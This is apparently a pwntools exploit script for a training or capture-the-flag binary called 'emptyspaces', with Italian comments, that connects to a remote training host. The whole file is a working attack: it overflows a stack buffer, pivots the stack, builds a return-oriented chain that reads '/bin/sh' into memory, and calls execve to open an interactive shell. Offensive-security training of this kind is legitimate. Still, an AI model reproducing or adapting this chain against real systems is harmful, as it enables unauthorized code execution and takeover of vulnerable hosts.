from pwn import *
import time
context.update(arch='amd64', os='linux')
context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    p = process("./emptyspaces")
    gdb.attach(p, """
        #b *0x00400c14
        c
        """)
    input("wait")
else:
    p = remote("bin.training.offdef.it", 4006)

read=0x04497b0
pop_rdx_rsi=0x44bd59
pop_rdi=0x400696
pop_rax=0x4155a4
syscall=0x40128c
pop_rsp=0x401da3


payload=b"A"*64
payload+=b"BBBBBBBB"  #rbp
payload+=p64(pop_rdx_rsi)
payload+=p64(400)       #rdx read 8 bytes for /bin/sh\x00
payload+=p64(0x6bc550)   #indirizzo dove salvo /bin/sh\x00
payload+=p64(pop_rdi)
payload+=p64(0)
payload+=p64(read)  #call to read
payload+=p64(pop_rsp)    #cambio l'rsp e lo faccio puntare alla zona in cui si trova il codice da eseguire
payload+=p64(0x6bc550)

p.sendline(payload)
time.sleep(0.1)
input("wait")

payload=p64(pop_rdx_rsi)
payload+=p64(8)       #rdx read 8 bytes for /bin/sh\x00
payload+=p64(0x6bc500)   #indirizzo dove salvo /bin/sh\x00
payload+=p64(pop_rdi)
payload+=p64(0)
payload+=p64(read)  #call to read
payload+=p64(pop_rdx_rsi)
payload+=p64(0)
payload+=p64(0)
payload+=p64(pop_rdi)
payload+=p64(0x6bc500)
payload+=p64(pop_rax)
payload+=p64(0x3b)
payload+=p64(syscall)

p.send(payload)
time.sleep(0.1)
input("wait")
p.send(b"/bin/sh\x00")

p.interactive()